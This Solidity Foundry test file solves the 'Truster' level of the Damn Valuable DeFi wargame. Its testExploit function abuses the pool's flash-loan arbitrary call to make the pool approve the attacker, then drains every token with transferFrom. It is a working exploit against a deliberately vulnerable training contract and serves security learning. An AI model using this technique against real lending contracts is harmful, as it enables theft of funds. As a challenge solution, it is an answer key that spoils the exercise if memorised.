// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    Attack internal atk;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        atk = new Attack();
        // bytes memory data = abi.encodeWithSelector(
        //     dvt.approve.selector,
        //     address(attacker),
        //     type(uint256).max
        // );
        // * encodeCall is the best one to use, because it checks the typo and type error
        bytes memory data = abi.encodeCall(
            dvt.approve,
            (address(attacker), type(uint256).max)
        );

        trusterLenderPool.flashLoan(0, address(attacker), address(dvt), data);

        dvt.transferFrom(
            address(trusterLenderPool),
            address(attacker),
            dvt.balanceOf(address(trusterLenderPool))
        );
        console.log(dvt.balanceOf(address(trusterLenderPool)));
        console.log(dvt.balanceOf(address(attacker)));

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        // * msg.sender and the attacker are different address
        console.log(address(attacker));
        // no matter how you prank, the msg.sender won't change.
        console.log(address(msg.sender));
        validation();
        console.log(
            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
        );
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}

contract Attack {
    DamnValuableToken internal dvt;

    fallback() external payable {}
}

// shell cmd: forge test --match-contract Truster -vvv
